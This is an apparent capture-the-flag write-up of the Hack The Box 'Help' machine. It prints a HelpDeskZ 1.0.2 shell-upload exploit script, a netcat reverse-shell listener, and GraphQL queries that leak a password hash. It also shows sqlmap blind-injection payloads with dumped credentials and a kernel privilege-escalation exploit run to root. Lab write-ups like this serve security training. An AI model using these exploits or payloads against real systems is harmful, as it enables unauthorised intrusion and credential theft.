I've found 3 open ports and a `host` name of `help.htb` which I directly add to my `/etc/hosts` list.

I ran both `dirsearch` as well as `gobuster` and found the same results:

### 80/TCP - HTTP

Upon inspection of both endpoints I found that one showed a `HelpDeskZ` page:

![](../../../assets/436c467e8cb9037c8045af0b1e51ea45.png)

I looked it up and found a [GithHub repository](https://github.com/ViktorNova/HelpDeskZ). In the repository I saw a file called `UPGRADING.TXT` which I was curious whether I could find it on the machine.

I headed to the `URL` and found:

![](../../../assets/590009f71f4b650e32d454b3d885bd4d.png)

It seems that the version running is `1.0.2`, so I decide to check for vulnerabilities online.

![](../../../assets/6adf84021b4a93c22314280ca431a46b.png)

I found an exploit for an `Arbitrary File Upload` to the version running on our machine:

```
Steps to reproduce

httplocalhosthelpdeskzv=submit_ticket&action=displayForm

Enter anything in the mandatory fields, attach your phpshell.php, solve the captcha and submit your ticket.

Call this script with the base url of your HelpdeskZ-Installation and the name of the file you uploaded

exploit.py httplocalhosthelpdeskz phpshell.php
```

```python
import hashlib
import time
import sys
import requests
import datetime

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

if len(sys.argv) < 3:
    print "Usage {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]


r = requests.get(helpdeskzBaseUrl)

#Gets the current time of the server to prevent timezone errors - DoctorEww
currentTime = int((datetime.datetime.strptime(r.headers['date'], '%a, %d %b %Y %H:%M:%S %Z')  - datetime.datetime(1970,1,1)).total_seconds())

for x in range(0, 300):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200:
        print 'found!'
        print url
        sys.exit(0)

print 'Sorry, I did not find anything'
```

I configure and locate my `php-reverse-shell`:

![](../../../assets/be38905befd8b69dd8b7b91a703450bc.png)

![](../../../assets/f40cea4f0c9ba14b85495fa2ab172fc0.png)

I head to the following URL:

![](../../../assets/25c155a9984f10ac829844e41d188388.png)

Here I filled it in with some sample text and uploaded the reverse shell under the name `phpshell.php`. Once it is in the `/uploads` endpoint I can launch my exploit:

```bash
nc -lvnp 1234
```

```bash
┌──(kali㉿kali)-[~]
└─$ python exploit.py http://help.htb/support/ phpshell.php
```

This method kept giving me errors so Instead of pondering about it too much I focussed my attention on port `3000`.


### 3000/TCP - NodeJS

Once I navigated to `port 3000` I was greeted with the following:

![](../../../assets/25bc40a378f577690ba5130a36193241.png)

Inside the `Headers` tab I found this info:

![](../../../assets/4e962c3b3b393dc222ab77809000fcbb.png)

Just like we found out in our `nmap` scan, the server seems to be running on the `Express` framework. I used Google to find out more about this `Express Query Language` and stumbled upon the following:

![](../../../assets/8bbae23dc5492f9dcc01a397bdf6f540.png)

It seems to be running a `GraphQL` instance. I never heard of it before so I did my research and found their [official website](https://graphql.org/learn/) among other useful links and blogs.
It can be summed up in:

>`GraphQL` is a query language for your API, and a server-side runtime for executing queries using a type system you define for your data. `GraphQL` isn’t tied to any specific database or storage engine and is instead backed by your existing code and data.

This means we can execute `queries` on here, but how? Apparently you just use the `/graphql` endpoint together with your query:

![](../../../assets/4fb67906786a63ebfecd08640422ecca.png)

Let's start querying this server then!
I tried getting the `user` but it seems to be encoded:

![](../../../assets/7584e2f617dbc1f9f23239bd6f1c0ac0.png)

I'll try `curl` to fix this issue:

```bash
curl -s -G http://help.htb:3000/graphql --data-urlencode 'query={user {username} }' | jq
```

```bash
┌──(kali㉿kali)-[~]
└─$ curl -s -G http://help.htb:3000/graphql --data-urlencode 'query={user {username} }' | jq
{
  "data": {
    "user": {
      "username": "helpme@helpme.com"
    }
  }
}
```

Well looks like this finally gave us the output we needed! 
I will now try to get the password for this user:

```bash
curl -s -G http://help.htb:3000/graphql --data-urlencode 'query={user {password} }' | jq
```

```bash
┌──(kali㉿kali)-[~]
└─$ curl -s -G http://help.htb:3000/graphql --data-urlencode 'query={user {password} }' | jq 
{
  "data": {
    "user": {
      "password": "5d3c93182bb20f07b994a7f617e99cff"
    }
  }
}
```

I now got a hash which I then put into [crackstation](https://crackstation.net/):

![](../../../assets/03f9ee8ffed8bd4265e49f1b2ea4e459.png)

Appears to be a simple `md5` hash:

```
helpme
godhelpmeplz
```

Now that I've got a set of creds I can try and log in, I'll try `SSH` right away, but get no luck:

```bash
helpme@help.htb's password: 
helpme@help.htb: Permission denied (publickey,password).
```

Let's try other methods. I instead use the creds to login on the `HelpDeskZ` website:

![](../../../assets/931e1902c88193814e3fe7b47a224eff.png)

Once I'm in I start enumerating the website for possible next vectors. I realize that I had been too hasty on focussing on the `Arbitrary File Upload` vulnerability, as there is another one more applicable to us right now:

![](../../../assets/964472ed1060ee2ade44fd7d25ed415b.png)

Clicking on this `exploit` we find the following valuable info:

![](../../../assets/25991623d74ae618881f4a83991b42b4.png)

Following these steps I go to the `Submit Ticket` again and this time upload a random image (or file), I uploaded a random `.png` file.

The exploit wouldn't work correctly no matter how much I modified the exploit file.


## Retrace

I went ahead, took a break, and got back into it since I was not getting any progress.

- I know there is a `SQL Injection` vulnerability
- None of the `exploits` would fire up for me.

Instead I chose to analyse the `request` using `burpsuite` and see if that would work:

### burpsuite
I open up the tickets I have created earlier:

![](../../../assets/e34265655a2b15515268e2f996daa763.png)

Parallel I have `burp` open in order to analyse the request, I basically right-click the link of the attachment and copy the link:

![](../../../assets/eeef3bd77b6bf30fbd62eb2ef804e3e2.png)

I then insert it in another `URL` and try to make a request:

![](../../../assets/79ee4e20b218558e732f4940f63e82ab.png)

In `burp` the following shows up:

![](../../../assets/79a40ef47ca6ce53c0626868f366a1da.png)

Great, I can now go ahead and send this to `Repeater` for further analysis. 
Instead of actually going ahead and brute forcing a bunch of `SQL Injection` scripts I will use `sqlmap` to run it for me. I download the attachment through `burpsuite` and save the `request to file` using `Copy to file`:

![](../../../assets/30dc718cac342669ebd3beaf1cd6be52.png)

![](../../../assets/99d03f19cae4664c3309522957bf2029.png)

Then I can run the following command:

```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -r ticket.request --level 5 --risk 3 -p param[]
```

This gives me a huge output, but the interesting part is all the way down below:

```bash
sqlmap identified the following injection point(s) with a total of 11216 HTTP(s) requests:
---
Parameter: param[] (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: v=view_tickets&action=ticket&param[]=5&param[]=attachment&param[]=1&param[]=7 AND 3691=3691

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: v=view_tickets&action=ticket&param[]=5&param[]=attachment&param[]=1&param[]=7 AND (SELECT 3876 FROM (SELECT(SLEEP(5)))gwKi)
---

web server operating system: Linux Ubuntu 16.04 or 16.10 (xenial or yakkety)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.12
```

I then re-run the command with `--dump` appended and wait for the output.
From this gigantic output this is the most interesting part:

```bash
| 1  | support@mysite.com | 1547216217 | NULL   | 1       | Enable   | Administrator | d318f44739dced66793b1a603028133a76ae680e (Welcome1) | <blank>  | admin    | Best regards,\r\nAdministrator | a:1:{i:0;s:1:"1";} | 1543429746 | 0
```

We got a new set of creds!

```
admin
Welcome1
```

I tried these creds to no avail unfortunately, seems we need to try out other combinations.
I tried these usernames and in the end only one seemed correct:

```bash
admin
root
helpme
help # This one got me through
```

```bash

## Privilege Escalation

After getting the `user` flag I used the following command to get `OS Info`:

```bash
(cat /proc/version || uname -a ) 2>/dev/null 
```

When I ran this I got the following output:

```bash
help@help:~$ (cat /proc/version || uname -a ) 2>/dev/null 
Linux version 4.4.0-116-generic (buildd@lgw01-amd64-021) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9) ) #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018
```

After looking this version up I found an exploit:

![](../../../assets/850e8ffadd84dddb1c164af3c2259c36.png)

![](../../../assets/07d92d769240380f5ea0e86101edaece.png)

I download the exploit and bring it over to the target machine:

```bash

Since this file is written in `C` we need to compile it using `gcc`:

```bash
gcc -o priv 44298.c
./priv
```

```bash
help@help:~$ gcc -o priv 44298.c
help@help:~$ ./priv
task_struct = ffff88001d387000
uidptr = ffff88003db1d184

### root.txt
Then we can `cat` the flag in `/root/root.txt`:

```bash
root@help:~# cat /root/root.txt 
157f2420d5ff83dc51d33f310df170c8
```
